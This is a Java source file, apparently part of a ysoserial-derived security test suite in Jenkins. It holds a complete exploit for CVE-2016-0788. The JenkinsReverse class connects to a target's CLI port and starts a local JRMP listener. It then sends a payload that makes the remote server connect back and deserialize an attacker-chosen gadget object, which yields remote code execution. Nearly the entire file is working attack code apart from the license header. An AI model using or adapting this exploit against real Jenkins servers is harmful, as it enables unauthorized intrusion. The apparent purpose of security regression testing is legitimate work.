/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package jenkins.security.security218.ysoserial.exploit;


import java.io.IOException;
import java.net.InetSocketAddress;
import java.rmi.registry.Registry;
import java.util.Random;

import hudson.remoting.Channel;
import jenkins.security.security218.ysoserial.exploit.JRMPListener;
import jenkins.security.security218.ysoserial.payloads.JRMPClient;
import jenkins.security.security218.ysoserial.payloads.ObjectPayload.Utils;


/**
 * CVE-2016-0788 exploit (2)
 * 
 * - Sets up a local {@link JRMPListener}
 * - Delivers a {@link ysoserial.payloads.JRMPClient} payload via the CLI protocol 
 *   that will cause the remote to open a JRMP connection to our listener
 * - upon connection the specified payload will be delivered to the remote 
 *    (that will deserialize using a default ObjectInputStream)
 * 
 * @author mbechler
 *
 */
public class JenkinsReverse {

    public static final void main ( final String[] args ) {
        if ( args.length < 4 ) {
            System.err.println(JenkinsListener.class.getName() + " <jenkins_url> <local_addr> <payload_type> <payload_arg>");
            System.exit(-1);
        }


        final Object payloadObject = Utils.makePayloadObject(args[2], args[3]);
        String myAddr = args[ 1 ];
        int jrmpPort = new Random().nextInt(65536 - 1024) + 1024;
        String jenkinsUrl = args[ 0 ];

        Thread t = null;
        Channel c = null;
        try {
            InetSocketAddress isa = JenkinsCLI.getCliPort(jenkinsUrl);
            c = JenkinsCLI.openChannel(isa);
            JRMPListener listener = new JRMPListener(jrmpPort, payloadObject);
            t = new Thread(listener, "ReverseDGC");
            t.setDaemon(true);
            t.start();
            Registry payload = new JRMPClient().getObject(myAddr + ":" + jrmpPort);
            c.call(JenkinsCLI.getPropertyCallable(payload));
            listener.waitFor(1000);
            listener.close();
        }
        catch ( Throwable e ) {
            e.printStackTrace();
        }
        finally {
            if ( c != null ) {
                try {
                    c.close();
                }
                catch ( IOException e ) {
                    e.printStackTrace(System.err);
                }
            }

            if ( t != null ) {
                t.interrupt();
                try {
                    t.join();
                }
                catch ( InterruptedException e ) {
                    e.printStackTrace(System.err);
                }
            }
        }
        Utils.releasePayload(args[2], payloadObject);
    }
}
